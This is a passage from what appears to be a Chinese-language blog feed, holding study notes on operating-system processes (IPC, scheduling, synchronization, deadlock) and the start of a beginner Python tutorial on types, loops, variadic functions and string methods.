id="1-3-进程和线程的区别"><a href="#1-3-进程和线程的区别" class="headerlink" title="1.3 进程和线程的区别"></a>1.3 进程和线程的区别</h2><ol><li>进程（Process）是系统进行<strong>资源分配和调度的基本单位</strong>，线程（Thread）是<strong>CPU调度和分派的基本单位</strong>；</li><li>线程依赖于进程而存在，一个进程至少有一个线程；</li><li>进程有自己的独立地址空间，<strong>线程共享所属进程的地址空间</strong>；</li><li>进程是拥有系统资源的一个独立单位，而线程自己基本上不拥有系统资源，只拥有一点在运行中必不可少的资源（如程序计数器、一组寄存器和栈），和其他线程共享本进程的相关资源如内存、I&#x2F;O、CPU等；</li><li>在进程切换时，涉及到整个当前进程CPU环境的保存环境的设置以及新被调度运行的CPU环境的设置，而线程切换只需保存和设置少量的寄存器的内容，并不涉及存储器管理方面的操作，可见，进程切换的开销远大于线程切换的开销；</li><li><strong>线程之间的通信更方便</strong>，同一进程下的线程共享全局变量等数据，而进程之间的通信需要以进程间通信（<code>IPC</code>）的方式进行；</li><li>多线程程序只要有一个线程崩溃，整个程序就崩溃了，但多进程程序中一个进程崩溃并不会对其它进程造成影响，因为进程有自己的独立地址空间，因此<strong>多进程更加健壮</strong>；</li></ol><h2 id="1-4-进程和程序的区别"><a href="#1-4-进程和程序的区别" class="headerlink" title="1.4 进程和程序的区别"></a>1.4 进程和程序的区别</h2><ol><li>程序是永存的；进程是暂时的，是程序在数据集上的一次执行，有创建有撤销，存在是暂时的；</li><li>程序是静态的观念，进程是动态的观念；</li><li>进程具有并发性，而程序没有；</li><li>进程是竞争计算机资源的基本单位，程序不是。</li><li>进程和程序不是一一对应的： 一个程序可对应多个进程即多个进程可执行同一程序； 一个进程可以执行一个或几个程序</li></ol><hr><h1 id="2-进程的通信方式？"><a href="#2-进程的通信方式？" class="headerlink" title="2 进程的通信方式？"></a>2 进程的通信方式？</h1><h2 id="2-1-共享内存"><a href="#2-1-共享内存" class="headerlink" title="2.1 共享内存"></a>2.1 共享内存</h2><p>顾名思义，共享内存就是两个进程同时共享一块内存，然后在这块内存上的数据可以共同修改和读取，达到通信的目的。</p><h2 id="2-2-无名管道"><a href="#2-2-无名管道" class="headerlink" title="2.2 无名管道"></a>2.2 无名管道</h2><p>无名管道是<strong>半双工</strong>的通信方式；并且只能在具有亲缘关系的进程之间使用（亲缘关系是指进程间的父子关系，兄弟关系等），具有亲缘关系的进程在创建时同时拥有一个无名管道的句柄，可以进行读写；</p><p>无名管道不存在磁盘节点，<strong>只存在与内存中用完即销毁</strong>。</p><h2 id="2-3-命名管道"><a href="#2-3-命名管道" class="headerlink" title="2.3 命名管道"></a>2.3 命名管道</h2><p>命名管道也是<strong>半双工</strong>的通信方式；可以在不具有亲缘关系的进程间通信；有名管道存在磁盘节点，有对应的FIFO文件，凡是可以访问该路径的文件的进程均可以进行通信。</p><h2 id="2-4-消息队列"><a href="#2-4-消息队列" class="headerlink" title="2.4 消息队列"></a>2.4 消息队列</h2><p>消息队列是由消息的链表，存放在内核中并由消息队列标识符标识。消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点。</p><h2 id="2-5-套接字"><a href="#2-5-套接字" class="headerlink" title="2.5 套接字"></a>2.5 套接字</h2><p>套接字是网络编程的<code>api</code>，通过套接字可以不同的机器间的进程进行通信，常用于客户端进程和服务器进程的通信。</p><h2 id="2-6-信号"><a href="#2-6-信号" class="headerlink" title="2.6 信号"></a>2.6 信号</h2><p>信号是Unix系统中使用的最古老的进程间通信的方法之一。操作系统通过信号来通知进程系统中发生了某种预先规定好的事件（一组事件中的一个），它也是用户进程之间通信和同步的一种原始机制。</p><p>一个键盘中断或者一个错误条件（比如进程试图访问它的虚拟内存中不存在的位置等）都有可能产生一个信号。Shell也使用信号向它的子进程发送作业控制信号。</p><hr><h1 id="3-进程的5种状态及转换过程？"><a href="#3-进程的5种状态及转换过程？" class="headerlink" title="3 进程的5种状态及转换过程？"></a>3 进程的5种状态及转换过程？</h1><p><img src="/2024/07/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F2%EF%BC%9A%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/image_679kQUFq4Q.png"></p><hr><h1 id="4-进程的调度算法有哪些？"><a href="#4-进程的调度算法有哪些？" class="headerlink" title="4 进程的调度算法有哪些？"></a>4 进程的调度算法有哪些？</h1><h2 id="4-1-先来先服务（FCFS）"><a href="#4-1-先来先服务（FCFS）" class="headerlink" title="4.1 先来先服务（FCFS）"></a>4.1 先来先服务（<code>FCFS</code>）</h2><p>按照请求的顺序进行调度。非抢占式，开销小，无饥饿问题，响应时间不确定（可能很慢）；</p><p>对短进程不利，对IO密集型进程不利。</p><h2 id="4-2-最短作业优先（SJF）"><a href="#4-2-最短作业优先（SJF）" class="headerlink" title="4.2 最短作业优先（SJF）"></a>4.2 最短作业优先（<code>SJF</code>）</h2><p>按估计运行时间最短的顺序进行调度。非抢占式，吞吐量高，开销可能较大，可能导致饥饿问题；</p><p>对短进程提供好的响应时间，对长进程不利。</p><h2 id="4-3-优先级调度算法"><a href="#4-3-优先级调度算法" class="headerlink" title="4.3 优先级调度算法"></a>4.3 优先级调度算法</h2><p>为每个进程分配一个优先级，按优先级进行调度。为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级。</p><h2 id="4-4-时间片轮转"><a href="#4-4-时间片轮转" class="headerlink" title="4.4 时间片轮转"></a>4.4 时间片轮转</h2><p>将所有就绪进程按 <code>FCFS</code>的原则排成一个队列，用完时间片的进程排到队列最后。</p><p>抢占式（时间片用完时），开销小，无饥饿问题，为短进程提供好的响应时间；若时间片小，进程切换频繁，吞吐量低；若时间片太长，实时性得不到保证。</p><h2 id="4-5-最高响应比优先"><a href="#4-5-最高响应比优先" class="headerlink" title="4.5 最高响应比优先"></a>4.5 最高响应比优先</h2><p>$$<br>响应比&#x3D;1+\frac{等待时间}{处理时间}<br>$$</p><p>同时考虑了等待时间的长短和估计需要的执行时间长短，很好的平衡了长短进程。非抢占，吞吐量高，开销可能较大，提供好的响应时间，无饥饿问题。</p><h2 id="4-6-多级反馈队列调度算法"><a href="#4-6-多级反馈队列调度算法" class="headerlink" title="4.6 多级反馈队列调度算法"></a>4.6 多级反馈队列调度算法</h2><p>设置多个就绪队列1、2、3…，优先级递减，时间片递增。只有等到优先级更高的队列为空时才会调度当前队列中的进程。如果进程用完了当前队列的时间片还未执行完，则会被移到下一队列。</p><p>抢占式（时间片用完时），开销可能较大，对IO型进程有利，可能会出现饥饿问题</p><hr><h1 id="5-同步和互斥？"><a href="#5-同步和互斥？" class="headerlink" title="5 同步和互斥？"></a>5 同步和互斥？</h1><h2 id="5-1-同步"><a href="#5-1-同步" class="headerlink" title="5.1 同步"></a>5.1 同步</h2><p>多个进程因为合作而使得进程的执行有一定的先后顺序。比如某个进程需要另一个进程提供的消息，获得消息之前进入阻塞态。</p><h2 id="5-2-互斥"><a href="#5-2-互斥" class="headerlink" title="5.2 互斥"></a>5.2 互斥</h2><p>多个进程在同一时刻只有一个进程能进入临界区。</p><h2 id="5-3-同步机制的4个准则"><a href="#5-3-同步机制的4个准则" class="headerlink" title="5.3 同步机制的4个准则"></a>5.3 同步机制的4个准则</h2><ol><li>空闲让进：当无进程处于临界区，可允许一个请求进入临界区的进程立即进入自己的临界区</li><li>忙则等待：当已有进程进入自己的临界区，所有企图进入临界区的进程必须等待</li><li>有限等待：对要求访问临界资源的进程，应保证该进程能在有限时间内进入自己的临界区</li><li>让权等待：当进程不能进入自己的临界区，应释放处理机</li></ol><hr><h1 id="6-进程同步相关概念"><a href="#6-进程同步相关概念" class="headerlink" title="6 进程同步相关概念"></a>6 进程同步相关概念</h1><p>为什么需要进程同步：进程有时候会和其他进程共享一些资源，比如内存、数据库等。当多个进程同时读写同一份共享资源的时候，可能会发生冲突。因此需要进程的同步，多个进程按顺序访问资源。</p><h2 id="6-1-互斥量Mutex"><a href="#6-1-互斥量Mutex" class="headerlink" title="6.1 互斥量Mutex"></a>6.1 互斥量<code>Mutex</code></h2><p>互斥量是内核对象，只有拥有互斥对象的线程才有访问互斥资源的权限。因为互斥对象只有一个，所以可以保证互斥资源不会被多个线程同时访问；当前拥有互斥对象的线程处理完任务后必须将互斥对象交出，以便其他线程访问该资源；</p><h2 id="6-2-信号量-Semaphore"><a href="#6-2-信号量-Semaphore" class="headerlink" title="6.2 信号量 Semaphore"></a>6.2 信号量 Semaphore</h2><p>信号量是内核对象，它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量。信号量对象保存了<strong>最大资源计数</strong>和<strong>当前可用资源计数</strong>，每增加一个线程对共享资源的访问，当前可用资源计数就减1，只要当前可用资源计数大于0，就可以发出信号量信号，如果为0，则将线程放入一个队列中等待。</p><p>线程处理完共享资源后，应在离开的同时通过 <code>ReleaseSemaphore</code>函数将当前可用资源数加1。如果信号量的取值只能为0或1，那么信号量就成为了互斥量；</p><h2 id="6-3-事件-Event"><a href="#6-3-事件-Event" class="headerlink" title="6.3 事件 Event"></a>6.3 事件 Event</h2><p>允许一个线程在处理完一个任务后，主动唤醒另外一个线程执行任务。事件分为手动重置事件和自动重置事件。</p><ol><li>手动重置事件被设置为激发状态后，会唤醒所有等待的线程，而且一直保持为激发状态，直到程序重新把它设置为未激发状态。</li><li>自动重置事件被设置为激发状态后，会唤醒一个等待中的线程，然后自动恢复为未激发状态。</li></ol><h2 id="6-4-临界区-Critical-Section"><a href="#6-4-临界区-Critical-Section" class="headerlink" title="6.4 临界区 Critical Section"></a>6.4 临界区 Critical Section</h2><p>指的是访问资源的那段代码，任意时刻只允许一个线程对临界资源进行访问。拥有临界区对象的线程可以访问该临界资源，其它试图访问该资源的线程将被挂起，直到临界区对象被释放。</p><hr><h1 id="7-死锁"><a href="#7-死锁" class="headerlink" title="7 死锁"></a>7 死锁</h1><h2 id="7-1-死锁的定义"><a href="#7-1-死锁的定义" class="headerlink" title="7.1 死锁的定义"></a>7.1 死锁的定义</h2><p>是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。</p><h2 id="7-2-死锁原因"><a href="#7-2-死锁原因" class="headerlink" title="7.2 死锁原因"></a>7.2 死锁原因</h2><ol><li>系统资源不足（对不可剥夺资源的竞争）</li><li>进程推进顺序不当（P1拥有A申请B，P2拥有B申请A）</li></ol><h2 id="7-3-产生死锁的必要条件"><a href="#7-3-产生死锁的必要条件" class="headerlink" title="7.3 产生死锁的必要条件"></a>7.3 产生死锁的必要条件</h2><ol><li>互斥条件：指进程对所分配到的资源进行排它性使用，即在一段时间内某资源只由一个进程占用。</li><li>请求和保持条件：指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放。</li><li>不剥夺条件：指进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放。</li><li>环路等待条件：指在发生死锁时，必然存在一个进程资源的环形链。</li></ol><h2 id="7-4-处理死锁的基本方法"><a href="#7-4-处理死锁的基本方法" class="headerlink" title="7.4 处理死锁的基本方法"></a>7.4 处理死锁的基本方法</h2><h3 id="7-4-1-预防死锁"><a href="#7-4-1-预防死锁" class="headerlink" title="7.4.1 预防死锁"></a>7.4.1 预防死锁</h3><p>这是一种较简单和直观的事先预防的方法。方法是通过设置某些限制条件，去破坏产生死锁的四个必要条件中的一个或者几个，来预防发生死锁。预防死锁是一种较易实现的方法，已被广泛使用。</p><p>但是由于所施加的限制条件往往太严格，可能会导致系统资源利用率和系统吞吐量降低。</p><h3 id="7-4-2-避免死锁"><a href="#7-4-2-避免死锁" class="headerlink" title="7.4.2 避免死锁"></a>7.4.2 避免死锁</h3><p>该方法同样是属于事先预防的策略，但它并不须事先采取各种限制措施去破坏产生死锁的的四个必要条件，而是在资源的动态分配过程中，用 某种方法去防止系统进入不安全状态，从而避免发生死锁。</p><h3 id="7-4-3-检测死锁"><a href="#7-4-3-检测死锁" class="headerlink" title="7.4.3 检测死锁"></a>7.4.3 检测死锁</h3><p>这种方法并不须事先采取任何限制性措施，也不必检查系统是否已经进入不安全区，此方法允许系统在运行过程中发生死锁。但可通过系统所设置的检测机构，及时地检测出死锁的发生，并精确地确定与死锁有关的进程和资源，然后采取适当措施，从系统中将已发生的死锁清除掉。</p><h3 id="7-4-4-解除死锁"><a href="#7-4-4-解除死锁" class="headerlink" title="7.4.4 解除死锁"></a>7.4.4 解除死锁</h3><p>这是与检测死锁相配套的一种措施。当检测到系统中已发生死锁时，须将进程从死锁状态中解脱出来。常用的实施方法是撤销或挂起一些进程，以便回收一些资源，再将这些资源分配给已处于阻塞状态的进程，使之转为就绪状态，以继续运行。</p><hr><h1 id="8-什么是饥饿？与死锁有什么差别？"><a href="#8-什么是饥饿？与死锁有什么差别？" class="headerlink" title="8 什么是饥饿？与死锁有什么差别？"></a>8 什么是饥饿？与死锁有什么差别？</h1><p>等待时间给进程推进和响应带来明显影响时成为进程饥饿。</p><p>饥饿并不代表系统已经死锁，但<strong>至少有一个程序的执行被无限期地推迟</strong>。</p><p>差别：</p><ol><li>进入饥饿的进程可以只有一个，但是死锁必须大于等于两个；</li><li>出于饥饿状态的进程可以是一个就绪进程，但是死锁状态的进程必定是阻塞进程。</li></ol><hr><h1 id="9-银行家算法"><a href="#9-银行家算法" class="headerlink" title="9 银行家算法"></a>9 银行家算法</h1><p>主要思想是<strong>避免系统进入不安全状态</strong>，在每次进行资源分配时，它首先检查系统是否有足够的资源满足要求，如果有，则先试行分配，并对分配后的新状态进行安全性检查。如果新状态安全，则正式分配上述资源，否则拒绝分配上述资源。</p><p>这样就保证系统始终处于安全状态，从而避免死锁现象的发生。</p><hr><h1 id="10-死锁定理"><a href="#10-死锁定理" class="headerlink" title="10 死锁定理"></a>10 死锁定理</h1><p>如果资源分配图是可以完全简化的（能消去所有的边），则没有死锁。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习1：基础语法</title>
      <link href="/2024/07/21/Python%E5%AD%A6%E4%B9%A01%EF%BC%9A%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>/2024/07/21/Python%E5%AD%A6%E4%B9%A01%EF%BC%9A%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="1-相关工具"><a href="#1-相关工具" class="headerlink" title="1 相关工具"></a>1 相关工具</h1><h2 id="1-1-IPython"><a href="#1-1-IPython" class="headerlink" title="1.1 IPython"></a>1.1 <code>IPython</code></h2><p><code>IPython</code>是一种基于Python的交互式解释器。相较于原生的Python交互式环境，<code>IPython</code>提供了更为强大的编辑和交互功能。可以通过Python的包管理工具pip安装<code>IPython</code>，具体的操作如下所示。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ipython</span><br></pre></td></tr></table></figure><p>安装成功后，可以通过下面的<code>ipython</code>命令启动<code>IPython</code>，如下图所示。</p><p><img src="/2024/07/21/Python%E5%AD%A6%E4%B9%A01%EF%BC%9A%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image_KXIPDuYvof.png"></p><hr><h1 id="2-语法"><a href="#2-语法" class="headerlink" title="2 语法"></a>2 语法</h1><h2 id="2-1-类型转换"><a href="#2-1-类型转换" class="headerlink" title="2.1 类型转换"></a>2.1 类型转换</h2><p>可以使用Python中内置的函数对变量类型进行转换：</p><ul><li><code>int()</code>：将一个数值或字符串转换成整数，可以指定进制。</li><li><code>float()</code>：将一个字符串转换成浮点数。</li><li><code>str()</code>：将指定的对象转换成字符串形式，可以指定编码。</li><li><code>chr()</code>：将整数转换成该编码对应的字符串（一个字符）。</li><li><code>ord()</code>：将字符串（一个字符）转换成对应的编码（整数）。</li></ul><p>其中注意一下<code>chr</code>和<code>ord</code>，这两个之前没用过。</p><p>下面的代码通过键盘输入两个整数来实现对两个整数的算术运算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">使用input()函数获取键盘输入(字符串)</span></span><br><span class="line"><span class="string">使用int()函数将输入的字符串转换成整数</span></span><br><span class="line"><span class="string">使用print()函数输出带占位符的字符串</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;a = &#x27;</span>))</span><br><span class="line">b = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;b = &#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%d + %d = %d&#x27;</span> % (a, b, a + b))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%d - %d = %d&#x27;</span> % (a, b, a - b))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%d * %d = %d&#x27;</span> % (a, b, a * b))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%d / %d = %f&#x27;</span> % (a, b, a / b))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%d // %d = %d&#x27;</span> % (a, b, a // b))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%d %% %d = %d&#x27;</span> % (a, b, a % b))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%d ** %d = %d&#x27;</span> % (a, b, a ** b))</span><br></pre></td></tr></table></figure><blockquote><p><strong>说明</strong>：上面的print函数中输出的字符串使用了占位符语法，其中<code>%d</code>是整数的占位符，<code>%f</code>是小数的占位符，<code>%%</code>表示百分号（因为百分号代表了占位符，所以带占位符的字符串中要表示百分号必须写成<code>%%</code>），字符串之后的<code>%</code>后面跟的变量值会替换掉占位符然后输出到终端中，运行上面的程序，看看程序执行结果就明白啦。</p></blockquote><h2 id="2-2-for-in循环"><a href="#2-2-for-in循环" class="headerlink" title="2.2 for-in循环"></a>2.2 for-in循环</h2><p>如果明确的知道循环执行的次数或者要对一个容器进行迭代（后面会讲到），那么我们推荐使用<code>for-in</code>循环，例如下面代码中计算1~100求和的结果（$\displaystyle \sum \limits_{n&#x3D;1}^{100}n$）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">用for循环实现1~100求和</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> += x</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><p>需要说明的是上面代码中的<code>range(1, 101)</code>可以用来构造一个从1到100的范围，当我们把这样一个范围放到<code>for-in</code>循环中，就可以通过前面的循环变量<code>x</code>依次取出从1到100的整数。当然，<code>range</code>的用法非常灵活，下面给出了一个例子：</p><ul><li><code>range(101)</code>：可以用来产生0到100范围的整数，需要注意的是取不到101。</li><li><code>range(1, 101)</code>：可以用来产生1到100范围的整数，相当于前面是闭区间后面是开区间。</li><li><code>range(1, 101, 2)</code>：可以用来产生1到100的奇数，其中2是步长，即每次数值递增的值。</li><li><code>range(100, 0, -2)</code>：可以用来产生100到1的偶数，其中-2是步长，即每次数字递减的值。</li></ul><p>知道了这一点，我们可以用下面的代码来实现1~100之间的偶数求和。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">用for循环实现1~100之间的偶数求和</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">101</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">sum</span> += x</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><h2 id="2-3-函数可变参数"><a href="#2-3-函数可变参数" class="headerlink" title="2.3 函数可变参数"></a>2.3 函数可变参数</h2><p>在不确定参数个数的时候，我们可以使用可变参数，代码如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在参数名前面的*表示args是一个可变参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">*args</span>):</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> args:</span><br><span class="line">        total += val</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在调用add函数时可以传入0个或多个参数</span></span><br><span class="line"><span class="built_in">print</span>(add())</span><br><span class="line"><span class="built_in">print</span>(add(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(add(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(add(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(add(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>))</span><br></pre></td></tr></table></figure><hr><h1 id="3-数据结构"><a href="#3-数据结构" class="headerlink" title="3 数据结构"></a>3 数据结构</h1><h2 id="3-1-字符串"><a href="#3-1-字符串" class="headerlink" title="3.1 字符串"></a>3.1 字符串</h2><p>Python为字符串类型提供了非常丰富的运算符，我们可以使用<code>+</code>运算符来实现字符串的拼接，可以使用<code>*</code>运算符来重复一个字符串的内容，可以使用<code>in</code>和<code>not in</code>来判断一个字符串是否包含另外一个字符串（成员运算），我们也可以用<code>[]</code>和<code>[:]</code>运算符从字符串取出某个字符或某些字符（切片运算），代码如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;hello &#x27;</span> * <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(s1) <span class="comment"># hello hello hello </span></span><br><span class="line">s2 = <span class="string">&#x27;world&#x27;</span></span><br><span class="line">s1 += s2</span><br><span class="line"><span class="built_in">print</span>(s1) <span class="comment"># hello hello hello world</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ll&#x27;</span> <span class="keyword">in</span> s1) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;good&#x27;</span> <span class="keyword">in</span> s1) <span class="comment"># False</span></span><br><span class="line">str2 = <span class="string">&#x27;abc123456&#x27;</span></span><br><span class="line"><span class="comment"># 从字符串中取出指定位置的字符(下标运算)</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>]) <span class="comment"># c</span></span><br><span class="line"><span class="comment"># 字符串切片(从指定的开始索引到指定的结束索引)</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>:<span class="number">5</span>]) <span class="comment"># c12</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>:]) <span class="comment"># c123456</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>::<span class="number">2</span>]) <span class="comment"># c246</span></span><br><span class="line"><span class="built_in">print</span>(str2[::<span class="number">2</span>]) <span class="comment"># ac246</span></span><br><span class="line"><span class="built_in">print</span>(str2[::-<span class="number">1</span>]) <span class="comment"># 654321cba</span></span><br><span class="line"><span class="built_in">print</span>(str2[-<span class="number">3</span>:-<span class="number">1</span>]) <span class="comment"># 45</span></span><br></pre></td></tr></table></figure><p>在Python中，我们还可以通过一系列的方法来完成对字符串的处理，代码如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;hello, world!&#x27;</span></span><br><span class="line"><span class="comment"># 通过内置函数len计算字符串的长度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(str1)) <span class="comment"># 13</span></span><br><span class="line"><span class="comment"># 获得字符串首字母大写的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str1.capitalize()) <span class="comment"># Hello, world!</span></span><br><span class="line"><span class="comment"># 获得字符串每个单词首字母大写的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str1.title()) <span class="comment"># Hello, World!</span></span><br><span class="line"><span class="comment"># 获得字符串变大写后的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str1.upper()) <span class="comment"># HELLO, WORLD!</span></span><br><span class="line"><span class="comment"># 从字符串中查找子串所在位置</span></span><br><span class="line"><span class="built_in">print</span>(str1.find(<span class="string">&#x27;or&#x27;</span>)) <span class="comment"># 8</span></span><br><span class="line"><span class="built_in">print</span>(str1.find(<span class="string">&#x27;shit&#x27;</span>)) <span class="comment"># -1</span></span><br><span class="line"><span class="comment"># 与find类似但找不到子串时会引发异常</span></span><br><span class="line"><span class="comment"># print(str1.index(&#x27;or&#x27;))</span></span><br><span class="line"><span class="comment"># print(str1.index(&#x27;shit&#x27;))</span></span><br><span class="line"><span class="comment"># 检查字符串是否以指定的字符串开头</span></span><br><span class="line"><span class="built_in">print</span>(str1.startswith(<span class="string">&#x27;He&#x27;</span>)) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(str1.startswith(<span class="string">&#x27;hel&#x27;</span>)) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 检查字符串是否以指定的字符串结尾</span></span><br><span class="line"><span class="built_in">print</span>(str1.endswith(<span class="string">&#x27;!&#x27;</span>)) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 将字符串以指定的宽度居中并在两侧填充指定的字符</span></span><br><span class="line"><span class="built_in">print</span>(str1.center(<span class="number">50</span>, <span class="string">&#x27;*&#x27;</span>))</span><br><span class="line"><span class="comment"># 将字符串以指定的宽度靠右放置左侧填充指定的字符</span></span><br><span class="line"><span class="built_in">print</span>(str1.rjust(<span class="number">50</span>, <span class="string">&#x27; &#x27;</span>))</span><br><span class="line">str2 = <span class="string">&#x27;abc123456&#x27;</span></span><br><span class="line"><span class="comment"># 检查字符串是否由数字构成</span></span><br><span class="line"><span class="built_in">print</span>(str2.isdigit())  <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 检查字符串是否以字母构成</span></span><br><span class="line"><span class="built_in">print</span>(str2.isalpha())  <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 检查字符串是否以数字和字母构成</span></span><br><span class="line"><span class="built_in">print</span>(str2.isalnum())  <span class="comment"># True</span></span><br><span class="line">str3 = <span class="string">&#x27;  jackfrued@126.com &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(str3)</span><br><span class="line"><span class="comment"># 获得字符串修剪左右两侧空格之后的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str3.strip())</span><br></pre></td></tr></table></figure><p>Python 3.6以后，格式化字符串还有更为简洁的书写方式，就是在字符串前加上字母<code>f</code>，我们可以使用下面的语法糖来简化上面的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 